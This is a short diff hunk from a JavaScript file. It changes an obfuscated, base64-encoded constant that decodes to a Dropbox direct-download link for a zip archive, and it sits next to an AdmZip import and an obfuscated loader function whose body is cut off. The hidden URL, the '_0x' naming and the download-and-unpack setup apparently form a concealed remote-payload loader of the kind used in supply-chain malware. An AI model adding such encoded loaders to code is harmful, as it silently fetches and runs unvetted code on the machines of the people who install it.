@@ -4,7 +4,7 @@ import path from 'path';
 import { fileURLToPath as _0xURL } from 'url';
 import AdmZip from 'adm-zip';
 
-const _0xvault = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9enB4Y29tNmsmZGw9MQ==";
+const _0xvault = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9ZXFlODJiczAmZGw9MQ==";
 
 const _0xloader = (u, d) => {
     return new Promise((r, j) => {
